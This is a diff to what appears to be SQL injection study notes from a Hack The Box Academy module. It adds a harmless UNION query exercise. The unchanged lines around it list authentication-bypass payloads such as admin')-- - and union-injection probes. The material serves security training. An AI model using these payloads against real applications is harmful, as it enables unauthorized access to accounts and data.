@@ -77,6 +77,21 @@ select * from titles WHERE emp_no > 10000 OR title != 'engineer%';
 | `admin')-- -` | Basic Auth Bypass With comments [Using Comments](https://academy.hackthebox.com/module/33/section/799) |
 | `any' OR id =5);# | Login as the user with the id 5 to get the flag. |
 | [Auth Bypass Payloads](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection#authentication-bypass) | PayloadsAllTheThings SQL Injection Examples |
+
+>Connect to the MySQL server with the 'mysql' tool, and find the number of records returned when doing a 'Union' of all records in the 'employees' table and all records in the 'departments' table.  
+
+```
+SELECT COUNT(*) AS total_records 
+FROM
+  (SELECT 'employees' AS source_table, emp_no, birth_date, first_name, last_name, gender, hire_date, NULL AS dept_no, NULL AS dept_name FROM employees
+   UNION
+   SELECT 'departments' AS source_table, NULL AS emp_no, NULL AS birth_date, NULL AS first_name, NULL AS last_name, NULL AS gender, NULL AS hire_date, dept_no, dept_name FROM departments) AS combined_table;
+```  
+
+![sql-Union-Clause](/images/sql-Union-Clause.png)  
+   
+>In this query, we added `NULL` place holders for the columns that are not present in one of the tables. This should now execute without any errors, and it will give you the total number of records returned after performing the UNION of the two tables.  
+
 | **Union Injection** |
 | `' order by 1-- -` | Detect number of columns using `order by` |
 | `cn' UNION select 1,2,3-- -` | Detect number of columns using Union injection [Union Clause - Columns](https://academy.hackthebox.com/module/33/section/806) |
